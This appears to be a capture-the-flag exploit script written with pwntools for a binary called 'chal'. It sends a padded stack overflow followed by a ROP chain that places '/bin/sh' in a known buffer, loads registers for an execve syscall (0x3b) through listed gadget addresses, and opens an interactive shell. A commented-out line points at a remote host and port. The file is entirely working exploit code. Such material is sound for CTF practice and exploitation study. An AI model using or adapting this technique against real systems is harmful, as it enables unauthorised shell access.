from pwn import *

context.arch = 'amd64'

r = process('./chal')
# r = remote('10.113.184.121' 10054)

name = 0x4c70c0
leave_ret = 0x0000000000401cfc
pop_rdi_ret = 0x0000000000401832
pop_rsi_ret = 0x000000000040f01e
pop_rax_ret = 0x0000000000448d27
pop_rdx_ret = 0x000000000040173f
syscall = 0x00000000004012d3

ROP = b'/bin/sh\x00'
ROP += flat(
    pop_rdi_ret, name,
    pop_rsi_ret, 0,
    pop_rdx_ret, 0,
    pop_rax_ret, 0x3b,
    syscall
)

# r.sendafter("Give me your name: ", ROP)
raw_input()
r.sendline(b'a'*0x20 + ROP)

r.interactive()